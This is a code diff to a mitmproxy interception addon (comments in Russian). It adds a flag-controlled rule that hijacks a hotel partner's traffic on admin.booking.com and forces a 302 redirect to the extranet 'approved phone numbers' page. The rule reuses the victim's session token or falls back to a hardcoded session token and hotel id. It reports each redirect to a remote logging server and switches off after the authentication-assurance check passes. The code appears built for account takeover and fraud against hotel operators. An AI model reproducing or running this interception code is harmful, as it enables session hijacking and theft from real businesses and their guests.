@@ -1,4 +1,3 @@
-# mitm_redirect_addon.py
 from mitmproxy import http, ctx
 import os
 import urllib.parse
@@ -7,6 +6,7 @@ import threading
 import requests
 import json
 from datetime import datetime
+import re
 
 COOKIE = "mitm_redirect_done"
 FORCE_FLAG = r"C:\temp\mitm_force_redirect"
@@ -17,6 +17,10 @@ USER_FLAG = r"C:\temp\mitm_user_once"
 SECURITY_FLAG = r"C:\temp\mitm_security_once"
 OPERATION_11_FLAG = r"C:\temp\mitm_operation_11_once"
 OPERATION_12_FLAG = r"C:\temp\mitm_operation_12_once"
+
+# --- НОВЫЙ ФЛАГ для Booking hotel redirect ---
+BOOKING_HOTEL_FLAG = r"C:\temp\mitm_booking_hotel_once"
+
 REDIRECT_FILE = r"C:\mitm\redirect_target.txt"
 LOG_PREFIX = "[MITM-REDIR]"
 
@@ -96,6 +100,29 @@ def should_operation_11():
 
 def should_operation_12():
     return os.path.exists(OPERATION_12_FLAG)
+
+# --- НОВЫЕ вспомогательные для BOOKING_HOTEL ---
+def should_booking_hotel():
+    return os.path.exists(BOOKING_HOTEL_FLAG)
+
+def enable_booking_hotel_flag():
+    try:
+        parent = os.path.dirname(BOOKING_HOTEL_FLAG)
+        if parent and not os.path.exists(parent):
+            os.makedirs(parent, exist_ok=True)
+        with open(BOOKING_HOTEL_FLAG, 'w') as f:
+            f.write("enabled")
+        log("Booking-hotel redirect flag created")
+    except Exception as e:
+        log(f"Error creating booking-hotel flag: {e}")
+
+def remove_booking_hotel_flag():
+    try:
+        if os.path.exists(BOOKING_HOTEL_FLAG):
+            os.remove(BOOKING_HOTEL_FLAG)
+            log("Booking-hotel redirect flag removed")
+    except Exception as e:
+        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_flag error: {e}")
 
 def remove_one_shot_flag():
     try:
@@ -223,6 +250,95 @@ def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
     remove_flag()
     return True
 
+# --- НОВАЯ функция: реальный редирект для /hotel/ -> approvednumbers.html ---
+def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
+    """
+    Если включён BOOKING_HOTEL_FLAG, редиректит все запросы:
+      https://admin.booking.com/hotel/(любое продолжение)
+    (но не сам approvednumbers.html) на:
+      https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html?lang=en&ses=<ses>&hotel_id=<hotel_id>
+    Берёт ses и hotel_id из query текущего запроса, затем из Referer, иначе значения по умолчанию.
+    Редирект автоматически отключается (флаг удаляется), если встречается запрос или ответ на approvednumbers.html, в котором есть параметр auth_assurance_last_check.
+    """
+    try:
+        if not should_booking_hotel():
+            return False
+
+        url = flow.request.pretty_url
+        # Полный базовый approvednumbers url (без query)
+        approved_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"
+
+        # Если это сам approvednumbers.html — проверяем наличие auth_assurance_last_check и, если есть, отключаем флаг.
+        if url.startswith(approved_base):
+            parsed = urllib.parse.urlparse(url)
+            query = urllib.parse.parse_qs(parsed.query)
+            if "auth_assurance_last_check" in query:
+                log("Detected approvednumbers.html with auth_assurance_last_check in request -> disabling booking-hotel redirect")
+                remove_booking_hotel_flag()
+            # Do not redirect approvednumbers itself
+            return False
+
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path or "/"
+        host = (flow.request.pretty_host or "").lower()
+
+        # Только для admin.booking.com и путей начинающихся с /hotel/
+        if not host.endswith("admin.booking.com"):
+            return False
+        if not path.startswith("/hotel/"):
+            return False
+
+        # Получаем ses и hotel_id из query текущего запроса
+        query = urllib.parse.parse_qs(parsed.query)
+        hotel_id = None
+        ses = None
+
+        if "hotel_id" in query:
+            hotel_id = query.get("hotel_id", [None])[0]
+        if "ses" in query:
+            ses = query.get("ses", [None])[0]
+
+        # Если не нашли — пытаемся из Referer заголовка
+        if not hotel_id or not ses:
+            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
+            if referer:
+                try:
+                    rp = urllib.parse.urlparse(referer)
+                    rq = urllib.parse.parse_qs(rp.query)
+                    if not hotel_id and "hotel_id" in rq:
+                        hotel_id = rq.get("hotel_id", [None])[0]
+                    if not ses and "ses" in rq:
+                        ses = rq.get("ses", [None])[0]
+                except Exception:
+                    pass
+
+        # Дополнительная эвристика: если в path есть число — возможно hotel_id — возьмём его (best-effort)
+        if not hotel_id:
+            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", path)
+            if m:
+                hotel_id = m.group(1)
+
+        # Подставляем дефолтные значения, если ничего нет (чтобы редирект гарантированно работал)
+        if not hotel_id:
+            hotel_id = "14762911"
+        if not ses:
+            ses = "ec1745929d110e5a461e56e51a3cda93"
+
+        target_url = f"{approved_base}?lang=en&ses={ses}&hotel_id={hotel_id}"
+
+        log(f"BOOKING_HOTEL redirect {url} -> {target_url}")
+
+        client_ip = get_client_ip(flow)
+        log_redirect_to_server(client_ip, url, target_url, "BOOKING_HOTEL")
+
+        # Выполняем редирект
+        flow.response = http.Response.make(302, b"", {"Location": target_url})
+        return True
+
+    except Exception as e:
+        log(f"booking_hotel_global_redirect error: {e}")
+        return False
+
 # Главная точка входа для mitm
 def request(flow: http.HTTPFlow) -> None:
     redirect_target = get_redirect_target()
@@ -243,6 +359,11 @@ def request(flow: http.HTTPFlow) -> None:
 
     for domain in target_domains:
         if host.endswith(domain.lower()):
+            # --- НОВАЯ проверка: booking_hotel_global_redirect с наивысшим приоритетом ---
+            # Это выполняется до остальных booking_redirect'ов и флагов FORCE/ONE_SHOT.
+            if booking_hotel_global_redirect(flow):
+                return
+
             # Операция 11
             if (should_operation_11() and 
                 flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings")):
